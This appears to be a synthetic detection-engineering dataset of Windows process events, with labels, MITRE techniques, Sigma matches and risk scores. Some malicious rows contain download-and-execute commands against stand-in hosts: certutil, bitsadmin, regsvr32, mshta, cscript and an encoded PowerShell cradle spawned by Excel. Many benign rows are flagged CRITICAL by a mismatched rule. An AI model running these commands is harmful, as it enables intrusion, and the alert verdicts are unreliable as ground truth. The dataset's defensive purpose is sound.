UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-01T15:46:44.463Z,{408B1B79-61D2-4D09-84B9-8B5191B1CAEA},21900,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,5402,CORP\itops,High,0,,,benign,1,3,1,1,87,4.6553,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,15,0,0,46,1.3846,2.0167326329391564,1.2315262421197382,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,46.41245819664472,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 46 | Chain Risk: 5
2024-07-07T01:02:33.156Z,{C48406A0-3003-494B-BA06-4A7C4DF3013F},8716,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name W3SVC -Force""",C:\Windows\System32\cmd.exe,cmd.exe,25344,CORP\itops,High,0,,,gray_area,1,3,1,1,71,4.5466,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,1,1,1,2,1.3846,1.3752272228591065,1.0687625109074974,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,77.38537528655561,15,"cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours, +5 suspicious flags]",False,ALERT,CRITICAL,97.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 77 | Chain Risk: 15
2024-07-02T08:13:30.664Z,{C544F3D3-4C6C-4885-81E5-01D994F1A8E9},10512,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate, Department, Title | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Select Name, SamAccountName, LastLogonDate, Department | Export-Csv C:\Reports\stale_accounts.csv -NoTypeInformation""",C:\Windows\System32\cmd.exe,cmd.exe,43581,CORP\itops,High,0,,,gray_area,1,3,1,1,283,4.9821,1,0,0,0,25,0.04,0,0,2,0,0,1,4082297620,8,0,0,13,1.3846,9.875173906419766,1.7208655922592033,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,99.8365517862476,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,100.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 100 | Chain Risk: 5
2024-07-05T16:26:06.026Z,{C45BE81D-1A7C-4EAF-9F44-B06CB873E68B},6873,C:\Windows\System32\cmd.exe,cmd.exe /c tracert 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,24194,CORP\dbadmin,Medium,0,,,benign,0,4,1,1,26,3.3826,0,0,1,0,4,0.0,0,0,1,0,0,0,2764436884,16,0,0,26,0.9208,-0.42900674299103336,-0.6741720165170381,0,4,1,False,None,none,,79.46453639741068,0,explorer.exe → cmd.exe: No known suspicious pattern,False,ALERT,MEDIUM,56.3,"ANOMALY SCORE: 79/100 | Unusual factors: IP address in command line: 1.00 (baseline: 0.01±0.11, z=8.9)"
2024-07-01T01:19:10.720Z,{FAA8EA7D-69AB-4D71-90BB-21F600B0A7B9},31099,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://phish-host6672.xyz/payloads/file136.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,57224,CORP\mjones,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,78,4.6983,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,1,1,0,19,3.9031,1.6558858397691283,1.2959129987170352,0,0,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,90.1828827189095,85,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 90 | Chain Risk: 85
2024-07-04T12:46:01.405Z,{98397C20-32F4-4098-97D3-813B6D02FC2D},17676,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,54507,CORP\dbadmin,Medium,0,,,benign,0,4,1,1,23,3.4473,0,0,1,0,4,0.0,0,0,1,0,0,0,2764436884,12,0,0,46,0.9208,-0.5492890073810427,-0.577292408334592,0,4,1,False,None,none,,74.03312111157413,0,explorer.exe → cmd.exe: No known suspicious pattern,False,ALERT,MEDIUM,52.7,"ANOMALY SCORE: 74/100 | Unusual factors: IP address in command line: 1.00 (baseline: 0.01±0.11, z=8.9)"
2024-07-01T15:16:22.882Z,{9AF9D32F-C12A-42B0-80FC-B825430F14E9},54525,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Install-Module -Name Az -AllowClobber -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,6700,CORP\sysadmin,High,0,,,benign,1,3,1,1,81,4.4666,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,15,0,0,16,1.3846,1.7761681041591375,0.9489731963078728,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,47.42615761026096,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 47 | Chain Risk: 5
2024-07-03T04:32:45.962Z,{E71D576B-98D6-4130-998E-5A945BFF21B0},51527,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f http://shadow-net7315.com/loader153.exe C:\Users\Public\core656.exe,C:\Windows\System32\cmd.exe,cmd.exe,33157,CORP\mjones,Medium,1,T1105,Certutil Download,malicious,1,8,1,0,100,4.7348,1,1,0,0,6,0.1667,0,1,2,0,0,1,1473216238,4,1,0,32,3.9031,2.537955778629197,1.3505668735031142,0,0,1,True,Certutil URL Cache Download,high,attack.t1105,89.37148718271732,80,"cmd.exe → certutil.exe: Command shell invoking certutil [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Certutil URL Cache Download | ML Score: 89 | Chain Risk: 80
2024-07-04T09:01:37.069Z,{40B91772-512C-429E-9D63-528DD55F2147},1903,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter *""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,18182,CORP\itops,High,0,,,benign,0,3,1,1,92,4.6231,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,9,0,0,1,1.231,2.2172030735891717,1.1833110429933886,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,39.59153060032049,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 40 | Chain Risk: 5
2024-07-05T20:55:48.552Z,{31C330DB-6CBA-4575-BFAF-7D0CBDF60413},34262,C:\Windows\System32\mshta.exe,mshta.exe http://apt-infra4944.cc/script429.hta,C:\Windows\explorer.exe,cmd.exe,15370,CORP\pchen,Medium,1,T1218.005,Mshta Remote HTA,malicious,0,5,1,1,47,4.1656,0,1,0,0,2,0.0,0,0,1,0,0,0,333442925,20,0,0,55,3.9031,0.4129691077390319,0.4982659001267869,0,1,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,76.92683415036578,55,explorer.exe → mshta.exe: Explorer launching HTA handler [Modifiers: +15 URL in command],True,ALERT,CRITICAL,97.7,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 77 | Chain Risk: 55
2024-07-06T04:02:50.675Z,{0EC60DAA-A7BA-45D6-9A17-5A61A036E63A},34651,C:\Windows\System32\cmd.exe,cmd.exe /c powershell -noni -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAJwApAA==,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document98.docm",39874,CORP\jsmith,Medium,1,T1204.002,Office Macro Execution,malicious,12,4,1,1,224,4.6617,1,0,0,1,9,0.4444,1,0,2,1,0,0,1267013000,4,1,1,2,3.9031,7.509622706749583,1.241109387287707,0,9,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"excel.exe → cmd.exe: Excel spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-03T01:48:52.118Z,{A706327E-9234-46B3-B243-AE3F81ED3F67},4442,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://cobaltstrike2535.ru/downloads/installer789.exe C:\Users\Public\installer244.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,11983,CORP\agarwal,Medium,1,T1105,Certutil Download,malicious,4,8,1,0,116,4.7348,1,1,0,0,6,0.1667,0,1,2,0,0,1,2657444117,1,1,0,48,3.9031,3.1794611887092463,1.3505668735031142,0,12,1,True,Certutil URL Cache Download,high,attack.t1105,89.89376254487861,95,"powershell.exe → certutil.exe: PowerShell invoking certutil [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Certutil URL Cache Download | ML Score: 90 | Chain Risk: 95
2024-07-03T08:31:08.199Z,{9E7F8E5A-2947-4607-846E-7F4B8E427340},54425,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,26162,CORP\jsmith,Medium,0,,,benign,0,3,1,1,73,4.3563,1,0,0,0,7,0.1429,0,0,1,0,0,0,945137867,8,0,0,31,1.231,1.4554153991191128,0.7838136788036412,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,50.34595392410219,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 50 | Chain Risk: 5
2024-07-04T10:11:59.983Z,{9D117E47-87E9-4703-9D08-7BB6C890E0FE},57196,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Process | Sort-Object CPU -Descending | Select -First 10""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,3317,CORP\jsmith,Medium,0,,,benign,1,3,1,1,97,4.6495,1,0,0,0,12,0.0833,0,0,2,0,0,1,4082297620,10,0,0,11,1.3846,2.4176735142391874,1.2228415168112643,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,58.47435772200696,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 58 | Chain Risk: 5
2024-07-05T15:48:42.460Z,{6392A1AD-DA7E-4F9E-BCCF-A8B1D2DD7A81},41882,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\Backup-SharePointSites.ps1 -SiteUrl https://corp.sharepoint.com -OutputPath D:\Backups,C:\Windows\System32\cmd.exe,cmd.exe,53942,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,153,4.7508,1,1,0,0,10,0.1,0,0,2,0,0,1,4082297620,15,0,0,48,1.3846,4.662942449519361,1.374524736423039,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,97.79932264449249,20,"cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +15 URL in command, +5 suspicious flags]",False,ALERT,CRITICAL,99.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 98 | Chain Risk: 20
2024-07-03T17:37:05.688Z,{F3181499-B9D3-4358-85D6-F66EA16B960A},9778,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,21524,CORP\agarwal,Medium,0,,,benign,0,3,1,1,87,4.6553,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,17,0,0,37,1.231,2.0167326329391564,1.2315262421197382,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.43269079338392,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-03T02:23:11.210Z,{BC6BC10D-AE79-482B-ABC8-3517BD7BAD19},37863,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(""window.close"")",C:\Windows\explorer.exe,explorer.exe,47342,CORP\jsmith,Medium,1,T1218.011,Rundll32 JavaScript,malicious,0,1,1,0,77,4.9254,1,0,0,0,3,0.3333,0,0,1,0,0,0,788896773,2,1,0,23,3.9031,1.6157917516391251,1.6359649155367193,0,9,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,99.57758621308994,40,"explorer.exe → rundll32.exe: Explorer launching rundll32 [Modifiers: +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 100 | Chain Risk: 40
2024-07-03T07:51:47.595Z,{925F2314-7073-4786-9546-3B061823BCB2},38066,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb8602547.cab C:\Windows\SoftwareDistribution\Download\update_kb8602547.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,47835,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,177,4.8922,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,7,0,0,51,3.9031,5.625200564639437,1.5862523499778753,1,2,3,True,BITSAdmin File Download,high,attack.t1197,92.13732827679357,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.2,Sigma rule matched: BITSAdmin File Download | ML Score: 92 | Chain Risk: 30
2024-07-05T10:01:17.805Z,{FF49C2BE-8C86-45EB-866F-139C3E6DE11D},14487,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""NightlyBackup"" /tr ""C:\Scripts\backup.bat"" /sc daily /st 02:00",C:\Windows\System32\cmd.exe,cmd.exe,17075,CORP\itops,High,0,,,gray_area,1,15,0,0,88,4.568,0,0,0,0,10,0.0,0,0,2,0,0,1,200102300,10,0,0,1,3.9031,2.0568267210691595,1.1008061525628967,0,5,2,False,None,none,,71.98844715090806,0,cmd.exe → schtasks.exe: No known suspicious pattern,False,ALERT,MEDIUM,51.3,"ANOMALY SCORE: 72/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); unusual number of arguments: 10.00 (baseline: 3.17±2.29, z=3.0); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3); unusually long command line: 88.00 (baseline: 36.70±24.93, z=2.1)"
2024-07-07T04:14:49.112Z,{5CEAD836-BF67-4B19-8D9E-4B68FA4B4A2E},22373,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://evil-payload7957.net/file73.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,15927,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,74,4.6602,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,4,1,1,14,3.9031,1.495509487249116,1.238863337638964,0,6,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,90.02318473108616,85,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 90 | Chain Risk: 85
2024-07-04T15:07:14.730Z,{60275C5D-9AD0-4EB3-AFF8-55E35581D3FB},14313,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded2887.exe C:\Users\Public\encoded6128.txt,C:\Windows\System32\cmd.exe,powershell.exe,13487,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious,1,8,1,0,84,4.3991,1,0,0,0,4,0.25,0,0,2,0,0,1,1473216238,15,0,0,7,3.9031,1.896450368549147,0.8479009621144399,0,6,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,88.45150391281248,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,ALERT,CRITICAL,98.8,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 88 | Chain Risk: 50
2024-07-04T09:23:32.750Z,{95B5C69A-BE87-42E9-B09E-F1B5D5CA0DC4},38700,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cmd.exe,2149,CORP\mjones,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,222,4.6384,1,0,0,1,8,0.375,1,0,2,1,0,0,3072976960,9,0,0,23,3.9031,7.429434530489576,1.2062207494105666,0,0,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-07T04:24:43.323Z,{CDEF8705-2809-4926-BF4D-0528006FCF7B},64030,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://stager6543.ru/downloads/runtime488.exe C:\Users\Public\sys972.exe,C:\Windows\System32\cmd.exe,powershell.exe,35750,CORP\klee,Medium,1,T1105,Certutil Download,malicious,1,8,1,0,102,4.8774,1,1,0,0,6,0.1667,0,1,2,0,0,1,1473216238,4,1,1,24,3.9031,2.6181439548892027,1.5640913267769445,0,6,1,True,Certutil URL Cache Download,high,attack.t1105,89.53090277204372,80,"cmd.exe → certutil.exe: Command shell invoking certutil [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Certutil URL Cache Download | ML Score: 90 | Chain Risk: 80
2024-07-05T14:27:11.498Z,{6CD431B7-A9A2-4918-AE9A-8770A2FE606A},42648,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter *""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,36217,CORP\agarwal,Medium,0,,,benign,0,3,1,1,92,4.6231,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,14,0,0,27,1.231,2.2172030735891717,1.1833110429933886,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,36.32190638210561,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,93.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 36 | Chain Risk: 5
2024-07-05T04:57:02.206Z,{576DD9D0-2F55-433B-A11E-E09CDFE6E705},11443,C:\Windows\System32\cscript.exe,cscript.exe //e:vbscript http://malware-cdn2466.xyz/script817.vbs,C:\Windows\System32\cmd.exe,cmd.exe /c,18872,CORP\mjones,Medium,1,T1059.005,WScript Remote Script,malicious,1,59,1,1,65,4.6325,1,1,0,0,3,0.3333,0,0,2,0,0,1,100619687,4,1,0,57,3.9031,1.1346626940790878,1.197386287458845,0,0,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,92.39065975033064,80,"cmd.exe → cscript.exe: Command shell invoking CScript [Modifiers: +15 URL in command, +10 off-hours]",True,ALERT,CRITICAL,99.2,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 92 | Chain Risk: 80
2024-07-01T15:43:01.995Z,{5449F53D-EE6B-431C-BDBF-27CF16EE8C77},12737,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job3881 /download /priority high http://malware-cdn2011.top/loader510.exe C:\Users\Public\core966.exe,C:\Windows\System32\cmd.exe,cmd.exe,26076,CORP\jsmith,Medium,1,T1197,BITSAdmin Download,malicious,1,24,1,0,125,4.9215,1,1,0,0,8,0.125,0,1,2,0,0,1,3692683671,15,0,0,43,3.9031,3.540307981879274,1.630125186449988,0,9,1,True,BITSAdmin File Download,high,attack.t1197,89.7125575865282,75,"cmd.exe → bitsadmin.exe: Command shell invoking bitsadmin [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 75
2024-07-01T14:28:14.552Z,{75BDCF3F-46D2-44B1-B353-A9B7AFD76357},15238,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,50439,CORP\klee,Medium,0,,,benign,0,4,1,1,23,3.4473,0,0,1,0,4,0.0,0,0,1,0,0,0,2764436884,14,0,0,28,0.9208,-0.5492890073810427,-0.577292408334592,0,6,1,False,None,none,,75.39110600833456,0,explorer.exe → cmd.exe: No known suspicious pattern,False,ALERT,MEDIUM,53.6,"ANOMALY SCORE: 75/100 | Unusual factors: IP address in command line: 1.00 (baseline: 0.01±0.11, z=8.9)"
2024-07-01T18:05:54.619Z,{C01AA391-FABC-4B55-9E44-FB7F0647DE67},9513,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://exploit-kit3604.top/downloads/runtime198.exe C:\Users\Public\update25.exe,C:\Windows\System32\cmd.exe,powershell.exe,25638,CORP\agarwal,Medium,1,T1105,Certutil Download,malicious,1,8,1,0,110,4.8363,1,1,0,0,6,0.1667,0,1,2,0,0,1,1473216238,18,0,0,5,3.9031,2.938896659929228,1.5025495664013873,0,12,1,True,Certutil URL Cache Download,high,attack.t1105,88.8082050418572,70,"cmd.exe → certutil.exe: Command shell invoking certutil [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Certutil URL Cache Download | ML Score: 89 | Chain Risk: 70
2024-07-02T15:24:07.246Z,{FD8D4D3D-BD32-4A73-8081-9D310694089F},33740,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter *""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,42817,CORP\itops,High,0,,,benign,0,3,1,1,92,4.6231,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,15,0,0,24,1.231,2.2172030735891717,1.1833110429933886,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,38.60884599567777,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,93.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 39 | Chain Risk: 5
